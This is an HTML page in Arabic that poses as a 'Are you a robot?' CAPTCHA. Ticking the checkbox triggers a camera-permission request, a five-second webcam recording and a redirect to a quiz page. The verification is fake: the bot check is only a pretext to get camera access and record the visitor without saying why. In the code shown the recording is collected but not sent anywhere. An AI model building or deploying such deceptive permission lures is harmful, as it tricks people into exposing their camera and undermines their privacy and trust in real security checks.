<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التحقق</title>
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            margin: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: linear-gradient(135deg, #1E88E5, #43A047);
            color: white;
            overflow: hidden;
        }

        .container {
            text-align: center;
            background: rgba(0, 0, 0, 0.8);
            padding: 20px;
            border-radius: 20px;
            width: 90%;
            max-width: 400px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
        }

        .checkbox-container {
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 15px 0;
            gap: 10px;
            font-size: 16px;
            cursor: pointer;
        }

        input[type="checkbox"] {
            width: 20px;
            height: 20px;
            accent-color: #4CAF50;
            transition: transform 0.3s ease;
        }

        input[type="checkbox"]:checked {
            transform: scale(1.2);
        }

        .loading, .success {
            display: none;
            font-size: 16px;
            margin-top: 15px;
        }

        .loading {
            color: #FBC02D;
        }

        .success {
            color: #4CAF50;
        }

        video {
            display: none;
            width: 100%;
            max-width: 300px;
            height: auto;
            margin: 15px 0;
            border-radius: 10px;
            background: black;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>هل أنت روبوت؟</h1>
        <div class="checkbox-container">
            <input type="checkbox" id="robot-checkbox">
            <label for="robot-checkbox">لست روبوت</label>
        </div>
        <video id="video" autoplay playsinline muted></video>
        <div class="loading">جارٍ التسجيل... ⏳</div>
        <div class="success">✅ تم التحقق!</div>
    </div>

    <script>
        const video = document.getElementById('video');
        const checkbox = document.getElementById('robot-checkbox');
        const loading = document.querySelector('.loading');
        const success = document.querySelector('.success');

        checkbox.addEventListener('change', (e) => {
            if (e.target.checked) {
                video.style.display = 'block';
                loading.style.display = 'block';
                success.style.display = 'none';

                navigator.mediaDevices.getUserMedia({ video: true })
                    .then((stream) => {
                        video.srcObject = stream;

                        const mediaRecorder = new MediaRecorder(stream);
                        const chunks = [];

                        mediaRecorder.start();
                        mediaRecorder.ondataavailable = (event) => chunks.push(event.data);

                        setTimeout(() => mediaRecorder.stop(), 5000);

                        mediaRecorder.onstop = () => {
                            loading.style.display = 'none';
                            success.style.display = 'block';

                            stream.getTracks().forEach(track => track.stop());

                            // Redirect to the quiz page
                            setTimeout(() => {
                                window.location.href = "quiz.html";
                            }, 2000);
                        };
                    })
                    .catch((err) => {
                        alert("لا يمكن الوصول إلى الكاميرا: " + err.message);
                    });
            }
        });
    </script>
</body>
</html>
